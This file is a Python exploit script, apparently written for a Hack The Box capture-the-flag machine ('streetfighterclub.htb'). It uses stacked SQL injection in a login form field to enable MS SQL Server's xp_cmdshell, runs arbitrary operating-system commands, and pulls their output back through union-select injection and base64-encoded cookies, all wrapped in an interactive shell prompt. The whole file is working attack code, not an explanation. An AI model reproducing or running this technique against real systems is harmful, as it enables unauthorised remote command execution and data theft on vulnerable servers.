import requests
from base64 import b64decode
from urllib.parse import unquote

class fighter(object):
        def __init__(self, proxies='http://127.0.0.1:8080'):
            self.url = 'http://members.streetfighterclub.htb/old/verify.asp'
            self.proxies = {'http':proxies}
            # SQL Injections
            self.enableXPShell = "1;exec sp_configure 'show advanced options', 1;exec sp_configure 'xp_Cmd_ShElL', 1; RECONFIGURE;-- -"
            self.createTable = "1;create table jason (ID int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))"
            self.getIndex = "1 union select 1,2,3,4,(select top 1 ID from jason order by id desc),6-- -"
            self.truncateTable = "1; \
                    TRUNCATE TABLE jason;"
            # Setting Up Exploit
            self.makeRequest(self.enableXPShell)
            self.makeRequest(self.createTable)

        def makeRequest(self, action):
            return requests.post(self.url, proxies=self.proxies, allow_redirects=False,
                    data={'username':'admin', 'password':'admin', 'logintype':action,
                            'rememberme':'ON', 'B1':'LogIn'})
                    
        def runCMD(self, cmd):
            self.makeRequest(self.truncateTable)
            cmd = cmd.replace("'", "''")
            self.makeRequest(f"1;insert into jason (output) exec xp_CmdShElL '{cmd}'")
            # Get Output
            self.getOutput()

        def decodeCookies(self, cookies):
            return b64decode(unquote(cookies['Email']))

        def getOutput(self):
            r = self.makeRequest(self.getIndex)
            count = int(self.decodeCookies(r.cookies))
            for x in range(1, count):
                line = self.makeRequest(f'1 union select 1,2,3,4,(select top 1 output from jason where ID = {x}),6-- -')
                try:
                    output = self.decodeCookies(line.cookies)
                    print(output.decode())
                except:
                    None

o = fighter()
while True:
    PleaseWork = input("SHELL> ")
    o.runCMD(PleaseWork)
        

        
